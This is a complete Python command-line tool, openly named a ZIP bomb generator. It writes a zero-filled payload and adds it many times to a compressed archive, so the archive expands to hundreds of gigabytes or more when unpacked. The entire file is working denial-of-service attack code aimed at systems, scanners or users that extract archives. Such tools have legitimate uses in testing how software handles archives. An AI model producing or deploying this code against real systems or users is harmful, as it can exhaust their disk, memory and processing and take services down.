import zipfile
import os
import sys
import argparse

UNITS = {
    "B": 1, "KB": 1 << 10, "MB": 1 << 20, "GB": 1 << 30,
    "TB": 1 << 40, "PB": 1 << 50, "EB": 1 << 60,
    "ZB": 1 << 70, "YB": 1 << 80,
}

def progress_bar(iteration, total, bar_length=50):
    progress = (iteration / total)
    percentage = int(progress * 100)
    arrow = '#' * int(round(progress * bar_length))
    spaces = ' ' * (bar_length - len(arrow))
    sys.stdout.write(f"\r[{arrow}{spaces}] {percentage}%")
    sys.stdout.flush()

def get_bytes(amount_str):
    try:
        value, unit = amount_str.strip().upper().split()
        return int(float(value) * UNITS[unit])
    except:
        raise ValueError("Format: <number> <unit>, e.g., 1 PB or 500 GB")

def build_zip_bomb(
    target_input="500 GB",
    payload_input="1 MB",
    zip_name="bomb.zip",
    folder_name="bomb-dir",
    verbose=True,
    show_progress=True
):
    PAYLOAD_NAME = "payload.txt"
    DECOMPRESSED_TOTAL = get_bytes(target_input)
    PAYLOAD_SIZE = get_bytes(payload_input)
    REPEATS = DECOMPRESSED_TOTAL // PAYLOAD_SIZE

    if verbose:
        print(f"\n  Creating ZIP bomb:\n")
        print(f"    Payload size:         {PAYLOAD_SIZE} bytes")
        print(f"    Total uncompressed:   {DECOMPRESSED_TOTAL} bytes")
        print(f"    File count:           {REPEATS}")
        print(f"    Output:               {zip_name}\n")

    with open(PAYLOAD_NAME, "wb") as f:
        f.write(b'\0' * PAYLOAD_SIZE)

    with zipfile.ZipFile(zip_name, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for i in range(REPEATS):
            arcname = f"{folder_name}/{i}.txt"
            zf.write(PAYLOAD_NAME, arcname)
            if show_progress:
                progress_bar(i + 1, REPEATS)

    os.remove(PAYLOAD_NAME)

    if verbose:
        print(f"\n\nCreated zip bomb: {zip_name}")

def main():
    parser = argparse.ArgumentParser(description="Create a ZIP bomb.")
    parser.add_argument("-t", "--target-size", default="500 GB", help="Decompressed size (e.g., '500 GB')")
    parser.add_argument("-p", "--payload-size", default="1 MB", help="Payload file size (e.g., '1 MB')")
    parser.add_argument("-o", "--output", default="bomb.zip", help="Output zip filename")
    parser.add_argument("-f", "--folder", default="bomb-dir", help="Folder name inside zip")
    parser.add_argument("-n","--no-progress", dest="progress", action="store_false", help="Disable progress bar")
    parser.add_argument("-q", "--quiet", dest="verbose", action="store_false", help="Silence output")
    parser.set_defaults(progress=True, verbose=True)
    args = parser.parse_args()

    build_zip_bomb(
        target_input=args.target_size,
        payload_input=args.payload_size,
        zip_name=args.output,
        folder_name=args.folder,
        verbose=args.verbose,
        show_progress=args.progress
    )

if __name__ == "__main__":
    main()
